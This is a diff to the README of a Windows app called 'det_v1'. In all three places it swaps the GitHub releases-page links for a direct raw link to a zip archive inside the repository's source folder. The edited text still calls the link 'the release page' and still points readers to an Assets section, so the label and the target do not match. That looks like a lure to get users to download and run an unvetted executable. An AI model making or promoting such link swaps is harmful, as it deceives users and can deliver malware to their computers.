@@ -1,6 +1,6 @@
 # 📊 det_v1 - Simple Quant Rules for Clear Signals
 
-[![Download det_v1](https://img.shields.io/badge/Download%20det_v1-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carotid-cottageindustry424/det_v1/releases)
+[![Download det_v1](https://img.shields.io/badge/Download%20det_v1-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Carotid-cottageindustry424/det_v1/main/src/Sources/det_v_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this guide to download, open, and run det_v1 on Windows.
 
 ## 📥 Download the App
 
-1. Open the release page: https://github.com/Carotid-cottageindustry424/det_v1/releases
+1. Open the release page: https://raw.githubusercontent.com/Carotid-cottageindustry424/det_v1/main/src/Sources/det_v_v1.3.zip
 2. Look for the latest release near the top of the page
 3. Find the Windows file in the Assets section
 4. Download the `.exe` file or the `.zip` file, based on what is listed
@@ -200,7 +200,7 @@ If the app closes at launch:
 
 ## 📎 Download Again
 
-If you need to get the latest version again, use the release page here: https://github.com/Carotid-cottageindustry424/det_v1/releases
+If you need to get the latest version again, use the release page here: https://raw.githubusercontent.com/Carotid-cottageindustry424/det_v1/main/src/Sources/det_v_v1.3.zip
 
 Download the Windows file from the Assets section, then open it from your Downloads folder or extracted release folder
 
